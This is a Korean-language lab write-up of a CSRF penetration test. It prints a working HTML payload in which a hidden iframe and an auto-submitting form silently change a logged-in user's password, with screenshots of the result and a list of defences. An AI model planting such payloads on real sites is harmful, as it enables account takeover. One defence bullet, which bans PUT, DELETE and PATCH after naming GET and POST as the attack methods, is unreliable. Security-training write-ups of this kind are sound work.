## CSRF 모의해킹
CSRF(Cross-Site Request Forgery) 공격은 인증된 사용자의 권한을 사용하여 악의적인 요청을 보내는 공격입니다. 이번 모의해킹에서는 공격자가 악성 요청을 보내어 다른 사용자의 비밀번호를 임의로 수정하는 공격을 다루었습니다.

## 공격 실습

공격자는 다음과같은 HTML 코드를 게시글에 작성합니다.
```html
<iframe name="ifr" width=0 height=0></iframe>
<FORM target="ifr" id="chpw" METHOD="POST" action="http://192.168.219.180/login/changepw_do.php">
<INPUT type="hidden" name="pw" value="1234">
</FORM>
<script>document.getElementById("chpw").submit();</script>
패스워드 변경 1234
```
해당 코드를 살펴보면 HTML 의 iframe을 이용하여 width 와 height를 모두 0으로 설정하여 보이지 않도록하고 비밀번호를 1234로 변경하도록하는 POST 요청을 보냅니다.

**1. 사용자의 원래 비밀번호**

![csrf_userpw](https://github.com/Tree1st/HK/blob/master/webH/image/csrf/csrf_userpw.png)

**2. 사용자가 CSRF 공격이포함된 게시글 클릭**

![csrf_click](https://github.com/Tree1st/HK/blob/master/webH/image/csrf/csrf_click.png)

**3. 사용자의 비밀번호가 변경됨**

![csrf_changedpw](https://github.com/Tree1st/HK/blob/master/webH/image/csrf/csrf_changedpw.png)

## 대응 방안
- CSRF 토큰 사용: 서버 측에서 발급한 CSRF 토큰을 포함하여 요청을 보내도록 클라이언트에게 요청합니다. 이 토큰은 세션에 저장되어 있는 정보를 이용하여 생성됩니다. 공격자가 이 토큰을 알지 못하면 CSRF 공격을 수행할 수 없습니다.

- SameSite 쿠키 속성 사용: SameSite 쿠키 속성을 사용하여, 같은 도메인 내에서만 쿠키가 전송되도록 합니다. 이를 통해 CSRF 공격으로 인한 쿠키 변조를 막을 수 있습니다.

- Referrer 검증: Referer 헤더를 검증하여, 요청이 온 도메인이 맞는지 검증할 수 있습니다. 하지만, Referer 헤더는 클라이언트에서 조작이 가능하기 때문에 완전한 대응 방안은 아닙니다.

- 안전하지 않은 HTTP 메서드 사용 금지: CSRF 공격에서 주로 사용되는 HTTP 메서드는 GET과 POST입니다. PUT, DELETE, PATCH와 같은 안전하지 않은 HTTP 메서드를 사용하지 않도록 합니다.

- CSRF 방어 라이브러리 사용: CSRF 공격 방어를 위한 라이브러리를 사용하여, 자동으로 CSRF 토큰을 생성하고, 검증하는 등의 방어 기능을 제공합니다.
